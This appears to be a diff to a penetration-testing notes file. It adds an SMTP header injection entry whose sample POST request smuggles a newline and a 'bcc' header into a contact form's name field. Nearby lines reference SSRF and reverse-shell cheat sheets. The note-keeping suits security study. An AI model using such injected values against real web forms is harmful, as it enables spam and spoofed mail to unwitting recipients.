@@ -261,6 +261,13 @@
 ### SSRF
 	https://lab.wallarm.com/blind-ssrf-exploitation/
 
+### SMTP Header Injection
+	https://www.acunetix.com/blog/articles/email-header-injection/
+		POST /contact.php HTTP/1.1
+		Host: www.example2.com
+ 
+		name=Best Product\nbcc: everyone@example3.com&replyTo=blame_anna@example.com&message=Buy my product!
+
 ### Reverse Shell
 	http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 		Bash
